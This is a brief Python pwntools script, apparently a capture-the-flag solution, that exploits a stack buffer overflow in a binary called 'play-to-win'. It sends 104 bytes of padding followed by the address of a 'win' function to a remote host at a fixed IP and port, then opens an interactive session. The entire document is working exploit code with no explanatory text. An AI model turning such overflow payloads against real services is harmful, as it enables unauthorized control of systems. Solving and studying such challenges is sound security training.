from pwn import *
exe = context.binary = ELF('./play-to-win')
io = remote('129.241.209.70', 56705)
#io = process('./play-to-win') #uncomment this line to test locally
win_addr = 0x4012f4 #the address of the win function
payload = b'A'*104 + p64(win_addr)
io.sendline(payload)
io.interactive()
